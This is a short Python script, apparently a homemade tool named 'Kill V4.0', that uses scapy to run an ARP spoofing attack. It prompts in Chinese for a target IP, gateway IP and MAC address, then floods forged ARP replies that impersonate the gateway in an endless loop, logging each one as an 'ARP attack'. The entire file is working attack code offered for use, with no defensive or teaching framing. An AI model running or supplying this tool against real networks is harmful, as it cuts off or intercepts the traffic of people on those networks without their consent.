import sys
from scapy.all import ARP, Ether, sendp

######################
#Kill V4.0
######################
#################
#By xiaozhao45
#################



# 获取目标IP和网关IP地址
target_ip = input("请输入目标IP地址: ")
gateway_ip = input("请输入网关IP地址,不要加/24: ")
target_mac = input("请输入目标MAC地址: ")
if not target_ip or not gateway_ip:
    print("某个字符段为空！")
    target_ip = input("请输入目标IP地址: ")
    gateway_ip = input("请输入网关IP地址: ")


# 构造ARP请求包并发送到目标IP和网关IP
packet = Ether(dst=target_mac) / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
sendp(packet)

# 持续Fire the cannon！(开炮！)
while True:
    try:
        
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
        sendp(packet)
        print(f"已发送ARP攻击至 {target_ip}")
    except KeyboardInterrupt:
        # 如果用户按下Ctrl-C，则退出程序
        print("用户中断程序（Cease fire）")
        sys.exit(0)
